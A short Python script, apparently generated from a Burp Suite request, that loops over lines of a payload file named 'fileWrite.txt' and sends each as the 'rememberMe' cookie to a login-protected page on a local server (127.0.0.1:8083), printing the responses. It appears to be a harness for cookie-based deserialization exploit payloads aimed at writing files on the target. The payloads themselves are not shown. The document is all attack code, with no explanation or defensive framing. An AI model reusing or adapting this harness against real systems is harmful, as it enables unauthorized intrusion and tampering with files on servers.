import requests


with open("../fileWrite.txt", "r") as f:
    burp0_url = "http://127.0.0.1:8083/home"

    burp0_headers = {"Cache-Control": "max-age=0", "Accept-Language": "zh-CN,zh;q=0.9",
                     "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                     "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                     "Sec-Fetch-Dest": "document", "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
                     "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"",
                     "Referer": "http://127.0.0.1:8083/login?error", "Accept-Encoding": "gzip, deflate, br",
                     "Connection": "keep-alive"}
    for line in f:
        burp0_cookies = {"rememberMe": f"{line}"}
        resp = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        print(resp.text)